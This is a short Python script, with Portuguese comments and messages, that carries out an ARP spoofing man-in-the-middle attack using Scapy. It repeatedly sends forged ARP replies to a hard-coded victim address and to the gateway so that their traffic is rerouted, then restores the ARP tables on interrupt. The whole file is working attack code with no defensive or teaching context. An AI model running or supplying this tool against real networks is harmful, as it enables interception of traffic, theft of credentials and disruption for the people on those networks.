from scapy.all import ARP, Ether, send, srp
import time

def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans = srp(pkt, timeout=2, verbose=False)[0]
    if ans:
        return ans[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] MAC do alvo {target_ip} não encontrado.")
        return
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=False)

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if not target_mac or not spoof_mac:
        print("[!] Não foi possível restaurar ARP.")
        return
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac,
              psrc=spoof_ip, hwsrc=spoof_mac)
    send(pkt, count=4, verbose=False)

def main():
    target_ip = "192.168.1.10"   # IP da vítima
    gateway_ip = "192.168.1.1"   # IP do roteador

    try:
        print("[*] Iniciando ARP spoofing... (CTRL+C para parar)")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Interrompido! Restaurando ARP...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] ARP restaurado.")

if __name__ == "__main__":
    main()
